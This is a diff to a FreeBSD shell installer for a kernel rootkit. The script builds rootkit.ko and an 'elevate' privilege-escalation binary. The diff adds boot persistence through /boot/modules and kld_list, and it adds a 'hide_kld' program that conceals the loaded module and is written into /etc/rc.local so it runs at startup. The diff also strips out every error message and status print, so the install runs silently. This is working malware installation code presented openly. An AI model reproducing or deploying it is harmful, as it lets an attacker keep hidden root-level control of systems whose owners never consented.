@@ -2,81 +2,81 @@
 
 set -eu
 
-# CURRENTLY DOES NOT SUPPORT PERSISTENCE, ADD LATER
-
 PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)
+
 MODULE_DIR="$PROJECT_DIR/kernel"
-MODULE_FILE="$MODULE_DIR/rootkit.ko"
 USERSPACE_DIR="$PROJECT_DIR/user"
+PERSISTENCE_DIR="/boot/modules"
+
+MODULE_FILE="$MODULE_DIR/rootkit.ko"
+PERSISTENCE_FILE="$PERSISTENCE_DIR/rootkit.ko"
+
 ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
 ELEVATE_BIN="$USERSPACE_DIR/elevate"
 
-fail()
-{
-	printf 'Installation Error: %s\n' "$*" >&2
-	exit 1
-}
-
-
-# Checks for root privileges, FreeBSD OS, and required commands
-[ "$(id -u)" -eq 0 ] || fail "Run this script as root"
-[ "$(uname -s)" = "FreeBSD" ] || fail "This script is intended for FreeBSD only"
-[ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
-[ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
-
 
 # Check dependencies
-for command in make kldload kldstat cc install; do
-    command -v "$command" >/dev/null 2>&1 ||
-        fail "Required command not found: $command"
+for command in make kldload kldstat cc install sysrc realpath; do
+    command -v "$command" >/dev/null 2>&1
 done
 
 
 # Build rootkit.ko
-printf '%s\n' '[*] Building rootkit.ko...'
 make -C "$MODULE_DIR"
-[ -f "$MODULE_FILE" ] || fail "build could not create $MODULE_FILE"
+[ -f "$MODULE_FILE" ]
 
 
 # Build elevate
-printf '%s\n' '[*] Building elevate...'
-cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" || fail "Failed to build elevate"
+cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
 
 
-# Load rootkit.ko
-if kldstat -q -m rootkit >/dev/null 2>&1; then
-	printf '%s\n' '[*] rootkit.ko is already loaded'
-else
-	printf '%s\n' '[*] Loading rootkit.ko...'
-	kldload "$MODULE_FILE"
+# Ensures persistence 
+MODULE_LOADED=false
+if kldstat -q -m rootkit >/dev/null 2>&1 || [ -c /dev/rootkit ]; then
+    MODULE_LOADED=true
 fi
 
+install -d -m 755 "$PERSISTENCE_DIR"
+install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"
 
-# Check if rootkit.ko is loaded
-kldstat -q -m rootkit >/dev/null 2>&1 ||
-	fail "rootkit.ko was not found in the kernel module list after loading"
 
+# Add rootkit to kld_list without duplicating existing entries
+sysrc kld_list+=rootkit >/dev/null
+
+
+# Load it during the current boot
+if [ "$MODULE_LOADED" = false ]; then
+    kldload "$PERSISTENCE_FILE"
+
+    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
+        exit 1
+    fi
+fi
 
 # Verify elevate was built successfully
-[ -f "$ELEVATE_BIN" ] || fail "Build did not create $ELEVATE_BIN"
-[ -x "$ELEVATE_BIN" ] || fail "$ELEVATE_BIN is not executable"
+[ -f "$ELEVATE_BIN" ]
+[ -x "$ELEVATE_BIN" ]
 
 
 # Install elevate
-printf '%s\n' '[*] Installing elevate...'
-install -d -m 755 /usr/local/bin ||
-    fail "Failed to create /usr/local/bin"
-
-install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate ||
-    fail "Failed to install elevate"
+install -d -m 755 /usr/local/bin
+install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate
 
 
-# Print completion message
-printf '%s\n' '[+] Installation complete; module entry:'
-kldstat -m rootkit
-printf '%s\n' '[*] Unload with: kldunload rootkit'
+# Install hiding
+cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"
 
-# ./install_hiding
-cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" \
-    "$PROJECT_DIR/user/hide_kld.c"
-"$PROJECT_DIR/user/hide_kld"
+ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")
+
+if [ ! -f /etc/rc.local ]; then
+    echo "#!/bin/sh" > /etc/rc.local
+fi
+chmod +x /etc/rc.local
+
+
+# Ensures no duplicate entries in rc.local
+if ! grep -q "hide_kld" /etc/rc.local; then
+    echo "$ABS_PATH &" >> /etc/rc.local
+fi
+
+"$ABS_PATH" &
